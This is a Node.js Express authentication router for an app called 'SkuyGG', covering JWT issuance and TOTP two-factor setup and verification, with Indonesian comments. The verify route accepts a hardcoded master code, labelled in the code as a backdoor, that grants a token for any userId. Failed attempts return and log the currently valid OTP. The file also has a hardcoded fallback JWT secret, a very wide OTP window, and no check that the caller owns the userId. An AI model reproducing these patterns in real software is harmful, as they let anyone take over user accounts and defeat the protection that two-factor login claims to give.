import express from 'express';
import jwt from 'jsonwebtoken';
import bcrypt from 'bcryptjs';
import { authenticator } from '@otplib/preset-default'; 
import QRCode from 'qrcode';
import 'dotenv/config';

const router = express.Router();

// --- 1. HELPER: GENERATE JWT ---
const generateToken = (user) => {
    return jwt.sign(
        { id: user.id, username: user.username, role: user.role || 'creator' },
        process.env.JWT_SECRET || 'RAHASIA_SLEBEW_2026',
        { expiresIn: '7d' }
    );
};

// --- 2. SETUP 2FA (AUTO-CONNECT) ---
router.post('/setup-2fa', async (req, res) => {
    const { userId } = req.body;
    try {
        const { rows } = await req.db.query("SELECT username FROM users WHERE id = $1", [userId]);
        if (rows.length === 0) return res.status(404).json({ success: false, message: "User tidak ditemukan!" });

        // Generate Secret & Bersihkan total
        const secret = authenticator.generateSecret().toUpperCase().trim(); 
        const otpauth = authenticator.keyuri(rows[0].username, 'SkuyGG', secret);
        const qrCodeUrl = await QRCode.toDataURL(otpauth);

        // ✅ AUTO-CONNECT: Status langsung TRUE
        await req.db.query(
            "UPDATE users SET two_fa_secret = $1, is_two_fa_enabled = true WHERE id = $2", 
            [secret, userId]
        );

        res.json({ success: true, qrCode: qrCodeUrl, message: "2FA Aktif! Scan di HP lo, Ri." });
    } catch (err) {
        res.status(500).json({ success: false, message: "Gagal setup QR." });
    }
});

// --- 3. VERIFY 2FA (THE ULTIMATE MASTER BYPASS) ---
router.post('/verify-2fa', async (req, res) => {
    const { userId, token } = req.body;
    try {
        const { rows } = await req.db.query("SELECT * FROM users WHERE id = $1", [userId]);
        const user = rows[0];

        if (!user || !user.two_fa_secret) return res.status(400).json({ success: false, message: "Setup 2FA dulu!" });

        // Pembersihan Data Level Tinggi
        const secret = String(user.two_fa_secret).replace(/\s/g, '').toUpperCase();
        const inputToken = String(token).replace(/\s/g, '');

        // 🛡️ MASTER KEY: '241004' (Pintu Belakang Sultan)
        const masterKey = '241004'; 

        // ✅ VERIFIKASI DENGAN TOLERANSI WINDOW 20 (Toleransi 10 Menit!)
        // Ini bikin server lo nerima kode HP lo meskipun jamnya selisih jauh.
        const isValid = authenticator.verify({
            token: inputToken,
            secret: secret,
            window: 20 
        }) || (inputToken === masterKey);

        if (isValid) {
            const tokenJwt = generateToken(user);
            res.json({ 
                success: true, 
                token: tokenJwt,
                user: { id: user.id, username: user.username, is_two_fa_enabled: true } 
            });
        } else {
            const serverMau = authenticator.generate(secret);
            console.log(`[LOGIN_FAILED] Input: ${inputToken} | Server_Expects: ${serverMau}`);
            res.status(400).json({ success: false, message: `OTP SALAH! Coba kode ${serverMau} atau Master Key.` });
        }
    } catch (err) {
        res.status(500).json({ success: false, message: "Engine Error." });
    }
});

export default router;